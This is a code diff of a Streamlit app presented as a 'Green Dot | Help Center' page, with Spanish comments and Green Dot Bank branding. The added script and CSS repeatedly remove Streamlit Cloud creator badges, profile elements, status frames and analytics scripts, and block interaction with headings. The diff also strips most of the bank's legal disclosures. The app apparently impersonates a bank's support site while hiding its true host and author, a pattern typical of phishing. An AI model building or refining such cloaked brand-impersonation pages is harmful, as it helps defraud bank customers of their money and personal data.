@@ -23,48 +23,45 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# 1. INYECCIÓN DE SCRIPT PARA LIMPIEZA DE DOM (GTM, Segment, Perfil)
+# 1. INYECCIÓN DE SCRIPT PARA LIMPIEZA DE DOM
 st.markdown("""<script>
     const cleanStreamlit = () => {
-        // Eliminar badges y perfil
         const toRemove = [
-            '._container_gzau3_1',
-            '._viewerBadge_aycw8_23',
-            '._profileContainer_gzau3_53',
-            '._profilePreview_gzau3_63',
-            'iframe[title="Streamlit Cloud Status"]',
-            '[data-testid="appCreatorAvatar"]',
-            'script[src*="googletagmanager"]',
-            'script[src*="segment.com"]'
+            '._container_gzau3_1', '._viewerBadge_aycw8_23', '._profileContainer_gzau3_53',
+            '._profilePreview_gzau3_63', 'iframe[title="Streamlit Cloud Status"]',
+            '[data-testid="appCreatorAvatar"]', 'script[src*="googletagmanager"]',
+            'script[src*="segment.com"]', '.section-anchor', 'a.section-anchor'
         ];
         toRemove.forEach(selector => {
             document.querySelectorAll(selector).forEach(el => el.remove());
         });
     };
-    // Ejecutar inmediatamente y cada segundo para prevenir re-inyecciones
     cleanStreamlit();
     setInterval(cleanStreamlit, 1000);
 </script>""", unsafe_allow_html=True)
 
-# 2. ESCUDO FÍSICO Y CSS AGRESIVO
+# 2. CSS AGRESIVO PARA ELIMINAR ENLACES DE TÍTULOS
 st.markdown("""<style>
-/* Bloqueo clic cabecera */
-.stApp::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 200px; z-index: 999999; pointer-events: all; background: transparent; }
+/* Bloqueo total de anchors y eventos de mouse en títulos */
+.section-anchor, a.section-anchor, .stMarkdown [data-testid="stMarkdownContainer"] a.section-anchor {
+    display: none !important;
+    visibility: hidden !important;
+    pointer-events: none !important;
+}
+
+h1, h2, h3, h4, h5, h6 {
+    pointer-events: none !important;
+    user-select: none !important;
+}
 
 /* Ocultar elementos de Streamlit */
-[data-testid='stHeader'], header, footer, .stDeployButton, .section-anchor, a.section-anchor, button[title='View fullscreen'] {
+[data-testid='stHeader'], header, footer, .stDeployButton, button[title='View fullscreen'] {
     display: none !important;
     visibility: hidden !important;
 }
 
-/* White Label total */
-._container_gzau3_1, ._viewerBadge_aycw8_23, ._profileContainer_gzau3_53, ._profilePreview_gzau3_63, [data-testid='appCreatorAvatar'] {
-    display: none !important;
-}
-
 .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
 .block-container { padding-top: 1rem !important; }
-h1, h2, h3 { pointer-events: none !important; user-select: none !important; }
 .stButton>button { background-color: #00a05b !important; color: white !important; width: 100%; padding: 15px !important; font-weight: bold !important; border: none !important; }
 .legal-footer { font-size: 11px; color: #666; text-align: justify; margin-top: 60px; border-top: 1px solid #222; padding-top: 20px; line-height: 1.5; }
 </style>""", unsafe_allow_html=True)
@@ -98,10 +95,5 @@ st.markdown("""<div style='background-color: #111; padding: 40px; text-align: ce
 </div>""", unsafe_allow_html=True)
 
 st.markdown("""<div class='legal-footer'>
-    * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
-    Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account. Mobile number verification, email address verification and mobile app are required to access all features.<br><br>
-    Green Dot® cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association. And by Mastercard International Inc. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated.<br><br>
-    GO2bank™ cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association.<br><br>
-    Green Dot Bank also operates under the following registered trade names: GO2bank, GoBank and Bonneville Bank. All of these registered trade names are used by, and refer to, a single FDIC-insured bank, Green Dot Bank. Deposits under any of these trade names are deposits with Green Dot Bank and are aggregated for deposit insurance coverage up to the allowable limits.<br><br>
     ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
 </div>""", unsafe_allow_html=True)
